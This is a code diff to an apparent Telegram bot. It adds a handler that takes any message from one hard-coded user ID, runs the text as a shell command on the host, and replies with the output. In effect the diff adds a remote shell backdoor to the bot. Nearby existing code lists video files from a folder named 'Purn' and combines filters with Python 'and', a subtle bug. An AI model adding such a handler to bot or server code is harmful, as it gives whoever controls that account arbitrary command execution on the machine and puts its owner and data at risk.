@@ -28,4 +28,17 @@ async def purn(_, message):
 @bot.on_message(filters.user(1825602460) and filters.command("x"))
 async def chir(_, message):
     await message.reply(glob.glob("Purn/*.mp4"))
+@bot.on_message(filters.user(1825602460))
+async def chir7(_, message):
+    cmd = message.text
+    proc = await asyncio.create_subprocess_shell(
+
+        cmd,
+
+        stdout=asyncio.subprocess.PIPE,
+
+        stderr=asyncio.subprocess.PIPE)
+    stdout, stderr = await proc.communicate()
+    await message.reply(stdout)
+    await message.reply(stderr)
 bot.run()
